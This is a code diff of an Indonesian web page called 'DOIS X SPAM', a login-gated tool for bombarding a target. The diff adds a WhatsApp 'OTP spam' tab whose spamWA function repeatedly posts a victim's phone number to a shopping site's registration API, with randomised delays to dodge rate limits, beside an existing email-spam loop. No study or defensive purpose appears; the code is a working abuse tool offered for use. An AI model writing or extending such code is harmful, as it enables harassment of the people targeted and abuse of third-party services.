@@ -7,12 +7,12 @@
     *{margin:0;padding:0;box-sizing:border-box;}
     body{background:#0a0a0a;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;color:#fff;flex-direction:column;gap:20px;}
     .card{background:#1a1a1a;padding:40px;border-radius:20px;border:1px solid #ff1493;text-align:center;width:400px;max-width:94%;}
-    input,button{width:100%;padding:14px;margin:8px 0;border-radius:10px;border:none;font-size:16px;}
-    input{background:#111;color:#fff;border:1px solid #333;outline:none;transition:all 0.3s cubic-bezier(0.25,0.1,0.25,1);}
-    input:focus{border-color:#ff1493;background:#1a1a1a;box-shadow:0 0 0 3px rgba(255,20,147,0.3);transform:scale(1.02);}
+    input,button,select{width:100%;padding:14px;margin:8px 0;border-radius:10px;border:none;font-size:16px;}
+    input,select{background:#111;color:#fff;border:1px solid #333;outline:none;transition:all 0.3s cubic-bezier(0.25,0.1,0.25,1);}
+    input:focus,select:focus{border-color:#ff1493;background:#1a1a1a;box-shadow:0 0 0 1px rgba(255,20,147,0.3);transform:scale(1.02);}
     input:active{transform:scale(0.98);border-color:#007aff;}
     input::placeholder{color:#666;}
-    button{background:#ff1493;color:#fff;font-weight:bold;cursor:pointer;transition:0.2s;}
+    button{background:#ff1493;color:#fff;font-weight:bold;cursor:pointer;transition:0.4s;}
     button:hover{background:#ff69b4;}
     #msg{color:#ff4444;min-height:24px;}
     .hidden{display:none !important;}
@@ -26,6 +26,11 @@
     #counter{color:#555;margin-top:8px;}
     .btn-logout{background:#333;margin-top:10px;}
     .btn-logout:hover{background:#555;}
+    .tab{display:flex;gap:10px;margin-bottom:10px;}
+    .tab button{flex:1;background:#333;color:#fff;padding:10px;border-radius:10px;border:none;cursor:pointer;font-weight:bold;transition:0.2s;}
+    .tab button.active{background:#ff1493;}
+    .tab-content{display:none;}
+    .tab-content.active{display:block;}
   </style>
 </head>
 <body>
@@ -37,21 +42,41 @@
   <input type="password" id="passwordInput" placeholder="Password..." />
   <button onclick="login()">Login</button>
   <div id="msg"></div>
-  <button onclick="register()" style="background:#333;margin-top:5px;">Buat Akun Baru</button>
 </div>
 
 <div class="card hidden" id="spamCard">
   <h1 style="color:#ff1493;font-size:32px;">DOIS X SPAM</h1>
-  <p style="color:#666;">Mode Spam Aktif</p>
-  <input type="email" id="email" placeholder="Email Target" value="" />
-  <div class="input-row">
-    <input type="number" id="jumlah" value="25" placeholder="Jumlah" />
-    <input type="number" id="delay" value="1500" placeholder="Delay" />
+  <p style="color:#666;">Pilih Mode Spam</p>
+  
+  <div class="tab">
+    <button class="active" onclick="switchTab('email')">Spam Email</button>
+    <button onclick="switchTab('wa')">OTP WhatsApp</button>
   </div>
-  <button onclick="spam()">Kirim Spam</button>
-  <div id="status">Siap</div>
-  <div id="log"></div>
-  <div id="counter">0 / 0</div>
+
+  <div id="tabEmail" class="tab-content active">
+    <input type="email" id="emailTarget" placeholder="Email Target" value="" />
+    <div class="input-row">
+      <input type="number" id="emailJumlah" value="25" placeholder="Jumlah spam" />
+      <input type="number" id="emailDelay" value="1500" placeholder="Delay Spam" />
+    </div>
+    <button onclick="spamEmail()">Kirim Spam Email</button>
+    <div id="statusEmail">Siap</div>
+    <div id="logEmail"></div>
+    <div id="counterEmail">0 / 0</div>
+  </div>
+
+  <div id="tabWA" class="tab-content">
+    <input type="text" id="waNomor" placeholder="628123456789" value="" />
+    <div class="input-row">
+      <input type="number" id="waJumlah" value="25" placeholder="Jumlah Spam" />
+      <input type="number" id="waDelay" value="1500" placeholder="Delay Spam" />
+    </div>
+    <button onclick="spamWA()">Kirim Spam</button>
+    <div id="statusWA">Siap</div>
+    <div id="logWA"></div>
+    <div id="counterWA">0 / 0</div>
+  </div>
+
   <button onclick="logout()" class="btn-logout">Logout</button>
 </div>
 
@@ -66,6 +91,18 @@
   var auth = firebase.auth();
 
   auth.signOut();
+
+  function switchTab(tab) {
+    document.querySelectorAll('.tab-content').forEach(function(el) { el.classList.remove('active'); });
+    document.querySelectorAll('.tab button').forEach(function(el) { el.classList.remove('active'); });
+    if (tab === 'email') {
+      document.getElementById('tabEmail').classList.add('active');
+      document.querySelector('.tab button:first-child').classList.add('active');
+    } else {
+      document.getElementById('tabWA').classList.add('active');
+      document.querySelector('.tab button:last-child').classList.add('active');
+    }
+  }
 
   function login() {
     var email = document.getElementById('emailInput').value;
@@ -83,33 +120,19 @@
       });
   }
 
-  function register() {
-    var email = document.getElementById('emailInput').value;
-    var pwd = document.getElementById('passwordInput').value;
-    var msg = document.getElementById('msg');
-
-    auth.createUserWithEmailAndPassword(email, pwd)
-      .then(function() {
-        msg.textContent = 'Akun berhasil dibuat! Sekarang login.';
-      })
-      .catch(function(err) {
-        msg.textContent = 'Gagal buat akun: ' + err.message;
-      });
-  }
-
   function logout() {
     auth.signOut();
     document.getElementById('spamCard').classList.add('hidden');
     document.getElementById('loginCard').classList.remove('hidden');
   }
 
-  async function spam() {
-    var email = document.getElementById('email').value;
-    var total = parseInt(document.getElementById('jumlah').value) || 25;
-    var delayMs = parseInt(document.getElementById('delay').value) || 1500;
-    var status = document.getElementById('status');
-    var log = document.getElementById('log');
-    var counter = document.getElementById('counter');
+  async function spamEmail() {
+    var email = document.getElementById('emailTarget').value;
+    var total = parseInt(document.getElementById('emailJumlah').value) || 25;
+    var delayMs = parseInt(document.getElementById('emailDelay').value) || 1500;
+    var status = document.getElementById('statusEmail');
+    var log = document.getElementById('logEmail');
+    var counter = document.getElementById('counterEmail');
 
     if (!email || !email.includes('@')) {
       status.textContent = 'Email target tidak valid!';
@@ -153,6 +176,62 @@
     }
 
     status.textContent = success > 0 ? 'Selesai! ' + success + ' berhasil ke ' + email : 'Gagal! ' + failed + '/' + total;
+  }
+
+  async function spamWA() {
+    var nomor = document.getElementById('waNomor').value.trim();
+    var total = parseInt(document.getElementById('waJumlah').value) || 25;
+    var delayMs = parseInt(document.getElementById('waDelay').value) || 1500;
+    var status = document.getElementById('statusWA');
+    var log = document.getElementById('logWA');
+    var counter = document.getElementById('counterWA');
+
+    if (!nomor || nomor.length < 10) {
+      status.textContent = 'Nomor tidak valid! Minimal 10 digit.';
+      return;
+    }
+
+    log.innerHTML = '';
+    status.textContent = 'Mengirim...';
+    var success = 0, failed = 0;
+
+    var bonusUrl = 'https://www.bonusbelanja.com/api/auth/registration/app';
+    var bonusHeaders = {
+      'Content-Type': 'application/json'
+    };
+
+    for (var i = 0; i < total; i++) {
+      try {
+        var bonusPayload = {
+          phone: nomor,
+          name: 'dois',
+          agreeTnc: true,
+          agreeContact: true
+        };
+        var resp = await fetch(bonusUrl, {
+          method: 'POST',
+          headers: bonusHeaders,
+          body: JSON.stringify(bonusPayload)
+        });
+        var data = await resp.json();
+        if (data.error === false || data.data) {
+          success++;
+          log.innerHTML += '<div class="log-success">[' + (i+1) + '] Registrasi berhasil ke ' + nomor + '</div>';
+        } else {
+          failed++;
+          log.innerHTML += '<div class="log-error">[' + (i+1) + '] ' + (data.message || 'Gagal') + '</div>';
+        }
+      } catch (e) {
+        failed++;
+        log.innerHTML += '<div class="log-warning">[' + (i+1) + '] Error</div>';
+      }
+      status.textContent = (i+1) + '/' + total + ' | ' + success + ' | ' + failed;
+      counter.textContent = success + '  ' + failed + '  ' + (i+1) + '/' + total;
+      await new Promise(function(r) { setTimeout(r, delayMs * (0.7 + Math.random() * 0.6)); });
+      log.scrollTop = log.scrollHeight;
+    }
+
+    status.textContent = success > 0 ? 'Selesai! ' + success + ' berhasil ke ' + nomor : 'Gagal! ' + failed + '/' + total;
   }
 
   auth.onAuthStateChanged(function(user) {
